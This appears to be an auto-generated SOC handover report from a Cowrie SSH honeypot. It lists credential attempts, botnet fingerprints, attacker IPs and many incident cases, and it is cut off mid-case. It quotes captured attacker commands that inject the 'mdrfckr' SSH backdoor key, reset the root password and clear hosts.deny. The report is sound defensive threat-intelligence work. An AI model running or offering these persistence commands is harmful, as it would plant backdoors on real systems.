# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-05 |
| **Generated At** | 2026-05-05T06:20:54Z |
| **Shift Time** | 06:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **734** |
| Confirmed Threats | **632** |
| False Positives Filtered | **102** (13.9%) |
| Unique Attacker IPs | **44** |
| Countries of Origin | **20** |
| High Severity Cases | **50** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **684** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **157** |
| Unique Credential Pairs | **111** |
| Unique Usernames | **40** |
| Unique Passwords | **102** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 51 |
| `345gs5662d34` | 24 |
| `ubuntu` | 22 |
| `admin` | 10 |
| `postgres` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 24 |
| `test` | 4 |
| `123` | 3 |
| `1234` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 24 |
| `ubuntu` | `222333` | 1 |
| `deploy` | `deploy12345678` | 1 |
| `ftpuser` | `1q2w3e4r5t6y` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admina` | `43.159.177.40` | 2026-05-05T03:27:34 |
| `root` | `3245gs5662d34` | `43.159.177.40` | 2026-05-05T03:27:40 |
| `root` | `654123` | `104.168.30.30` | 2026-05-05T03:36:02 |
| `root` | `3245gs5662d34` | `104.168.30.30` | 2026-05-05T03:36:08 |
| `root` | `ruben123` | `104.168.30.30` | 2026-05-05T03:36:56 |
| `root` | `dt@123` | `104.168.30.30` | 2026-05-05T03:37:52 |
| `root` | `gitpass` | `43.159.177.40` | 2026-05-05T03:38:05 |
| `root` | `Pass123$` | `104.168.30.30` | 2026-05-05T03:38:46 |
| `root` | `Oracle123!@#` | `104.168.30.30` | 2026-05-05T03:40:39 |
| `root` | `server2018` | `43.159.177.40` | 2026-05-05T03:41:20 |
| `root` | `Supp0rt!` | `104.168.30.30` | 2026-05-05T03:41:30 |
| `root` | `password01` | `104.168.30.30` | 2026-05-05T03:42:21 |
| `root` | `qq159357` | `104.168.30.30` | 2026-05-05T03:44:02 |
| `root` | `Qwerty!@#$%^` | `104.168.30.30` | 2026-05-05T03:44:53 |
| `root` | `Change_Me` | `104.168.30.30` | 2026-05-05T03:45:47 |
| `root` | `root_password` | `104.168.30.30` | 2026-05-05T03:47:33 |
| `root` | `woaini` | `104.168.30.30` | 2026-05-05T03:48:23 |
| `root` | `Ko123456@` | `104.168.30.30` | 2026-05-05T03:50:53 |
| `root` | `Admin@12345678` | `104.168.30.30` | 2026-05-05T03:51:45 |
| `root` | `123456789d` | `104.168.30.30` | 2026-05-05T03:53:31 |
| `root` | `admin` | `121.165.84.80` | 2026-05-05T03:54:28 |
| `root` | `asd123@#` | `104.168.30.30` | 2026-05-05T03:55:13 |
| `root` | `Galaxy@123` | `104.168.30.30` | 2026-05-05T03:56:55 |
| `root` | `zhang1987` | `104.168.30.30` | 2026-05-05T03:57:45 |
| `root` | `a7758521` | `104.168.30.30` | 2026-05-05T03:58:37 |
| `root` | `admin!123` | `101.96.202.48` | 2026-05-05T04:49:17 |
| `root` | `vps12` | `185.158.22.150` | 2026-05-05T06:12:02 |
| `root` | `3245gs5662d34` | `185.158.22.150` | 2026-05-05T06:12:07 |
| `root` | `admin00` | `43.160.200.19` | 2026-05-05T06:16:33 |
| `root` | `3245gs5662d34` | `43.160.200.19` | 2026-05-05T06:16:36 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **734** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 201 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 181 | 7 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 181 | 7 | libssh-based |
| `95420f9d932d...` | libssh | 12 | 5 | — |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:FvJz1THQyl4Q"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.96.202.48`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.159.177.40`, `185.158.22.150`, `104.168.30.30`, `43.160.200.19`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **44** |
| Unique ASNs | **34** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS51167` | Contabo GmbH | 2 | HIGH |
| `AS701` | Verizon Business | 2 | LOW |
| `AS1221` | Telstra Limited | 1 | MEDIUM |
| `AS268991` | Lima e Carvalho Ltda | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (49)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d201eba73041

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-05-05 03:27 |
| **Last Seen** | 2026-05-05 03:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:27:32` | `cowrie.session.connect` |
| `2026-05-05 03:27:32` | `cowrie.client.version` |
| `2026-05-05 03:27:33` | `cowrie.client.kex` |
| `2026-05-05 03:27:34` | `cowrie.login.success` |
| `2026-05-05 03:27:34` | `cowrie.session.params` |
| `2026-05-05 03:27:34` | `cowrie.command.input` |
| `2026-05-05 03:27:34` | `cowrie.command.failed` |
| `2026-05-05 03:27:34` | `cowrie.log.closed` |
| `2026-05-05 03:27:35` | `cowrie.session.params` |
| `2026-05-05 03:27:35` | `cowrie.command.input` |
| `2026-05-05 03:27:35` | `cowrie.session.file_download` |
| `2026-05-05 03:27:35` | `cowrie.log.closed` |
| `2026-05-05 03:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9559022d8e92

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-05-05 03:27 |
| **Last Seen** | 2026-05-05 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:27:38` | `cowrie.session.connect` |
| `2026-05-05 03:27:38` | `cowrie.client.version` |
| `2026-05-05 03:27:39` | `cowrie.client.kex` |
| `2026-05-05 03:27:40` | `cowrie.login.success` |
| `2026-05-05 03:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f26a116419f

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:36 |
| **Last Seen** | 2026-05-05 03:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:36:00` | `cowrie.session.connect` |
| `2026-05-05 03:36:00` | `cowrie.client.version` |
| `2026-05-05 03:36:01` | `cowrie.client.kex` |
| `2026-05-05 03:36:02` | `cowrie.login.success` |
| `2026-05-05 03:36:02` | `cowrie.session.params` |
| `2026-05-05 03:36:02` | `cowrie.command.input` |
| `2026-05-05 03:36:02` | `cowrie.command.failed` |
| `2026-05-05 03:36:02` | `cowrie.log.closed` |
| `2026-05-05 03:36:03` | `cowrie.session.params` |
| `2026-05-05 03:36:03` | `cowrie.command.input` |
| `2026-05-05 03:36:03` | `cowrie.session.file_download` |
| `2026-05-05 03:36:03` | `cowrie.log.closed` |
| `2026-05-05 03:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb5d4b58e2b

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:36 |
| **Last Seen** | 2026-05-05 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:36:07` | `cowrie.session.connect` |
| `2026-05-05 03:36:07` | `cowrie.client.version` |
| `2026-05-05 03:36:07` | `cowrie.client.kex` |
| `2026-05-05 03:36:08` | `cowrie.login.success` |
| `2026-05-05 03:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ee59d0cbef

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:36 |
| **Last Seen** | 2026-05-05 03:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:36:55` | `cowrie.session.connect` |
| `2026-05-05 03:36:55` | `cowrie.client.version` |
| `2026-05-05 03:36:55` | `cowrie.client.kex` |
| `2026-05-05 03:36:56` | `cowrie.login.success` |
| `2026-05-05 03:36:57` | `cowrie.session.params` |
| `2026-05-05 03:36:57` | `cowrie.command.input` |
| `2026-05-05 03:36:57` | `cowrie.command.failed` |
| `2026-05-05 03:36:57` | `cowrie.log.closed` |
| `2026-05-05 03:36:58` | `cowrie.session.params` |
| `2026-05-05 03:36:58` | `cowrie.command.input` |
| `2026-05-05 03:36:58` | `cowrie.session.file_download` |
| `2026-05-05 03:36:58` | `cowrie.log.closed` |
| `2026-05-05 03:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-010ef98c6e82

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:37 |
| **Last Seen** | 2026-05-05 03:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:37:01` | `cowrie.session.connect` |
| `2026-05-05 03:37:01` | `cowrie.client.version` |
| `2026-05-05 03:37:01` | `cowrie.client.kex` |
| `2026-05-05 03:37:02` | `cowrie.login.success` |
| `2026-05-05 03:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d3bb0c7f18f

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:37 |
| **Last Seen** | 2026-05-05 03:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:37:51` | `cowrie.session.connect` |
| `2026-05-05 03:37:51` | `cowrie.client.version` |
| `2026-05-05 03:37:51` | `cowrie.client.kex` |
| `2026-05-05 03:37:52` | `cowrie.login.success` |
| `2026-05-05 03:37:53` | `cowrie.session.params` |
| `2026-05-05 03:37:53` | `cowrie.command.input` |
| `2026-05-05 03:37:53` | `cowrie.command.failed` |
| `2026-05-05 03:37:53` | `cowrie.log.closed` |
| `2026-05-05 03:37:53` | `cowrie.session.params` |
| `2026-05-05 03:37:53` | `cowrie.command.input` |
| `2026-05-05 03:37:54` | `cowrie.session.file_download` |
| `2026-05-05 03:37:54` | `cowrie.log.closed` |
| `2026-05-05 03:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7823a69b7a12

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:37 |
| **Last Seen** | 2026-05-05 03:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:37:57` | `cowrie.session.connect` |
| `2026-05-05 03:37:57` | `cowrie.client.version` |
| `2026-05-05 03:37:57` | `cowrie.client.kex` |
| `2026-05-05 03:37:58` | `cowrie.login.success` |
| `2026-05-05 03:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28fbce5273a8

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-05-05 03:38 |
| **Last Seen** | 2026-05-05 03:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:38:04` | `cowrie.session.connect` |
| `2026-05-05 03:38:04` | `cowrie.client.version` |
| `2026-05-05 03:38:04` | `cowrie.client.kex` |
| `2026-05-05 03:38:05` | `cowrie.login.success` |
| `2026-05-05 03:38:05` | `cowrie.session.params` |
| `2026-05-05 03:38:05` | `cowrie.command.input` |
| `2026-05-05 03:38:05` | `cowrie.command.failed` |
| `2026-05-05 03:38:06` | `cowrie.log.closed` |
| `2026-05-05 03:38:06` | `cowrie.session.params` |
| `2026-05-05 03:38:06` | `cowrie.command.input` |
| `2026-05-05 03:38:07` | `cowrie.session.file_download` |
| `2026-05-05 03:38:07` | `cowrie.log.closed` |
| `2026-05-05 03:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d829364d9e

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-05-05 03:38 |
| **Last Seen** | 2026-05-05 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:38:10` | `cowrie.session.connect` |
| `2026-05-05 03:38:10` | `cowrie.client.version` |
| `2026-05-05 03:38:10` | `cowrie.client.kex` |
| `2026-05-05 03:38:11` | `cowrie.login.success` |
| `2026-05-05 03:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118eea14c4bd

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:38 |
| **Last Seen** | 2026-05-05 03:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:38:45` | `cowrie.session.connect` |
| `2026-05-05 03:38:45` | `cowrie.client.version` |
| `2026-05-05 03:38:45` | `cowrie.client.kex` |
| `2026-05-05 03:38:46` | `cowrie.login.success` |
| `2026-05-05 03:38:47` | `cowrie.session.params` |
| `2026-05-05 03:38:47` | `cowrie.command.input` |
| `2026-05-05 03:38:47` | `cowrie.command.failed` |
| `2026-05-05 03:38:47` | `cowrie.log.closed` |
| `2026-05-05 03:38:48` | `cowrie.session.params` |
| `2026-05-05 03:38:48` | `cowrie.command.input` |
| `2026-05-05 03:38:48` | `cowrie.session.file_download` |
| `2026-05-05 03:38:48` | `cowrie.log.closed` |
| `2026-05-05 03:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521ed2c05209

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:38 |
| **Last Seen** | 2026-05-05 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:38:51` | `cowrie.session.connect` |
| `2026-05-05 03:38:51` | `cowrie.client.version` |
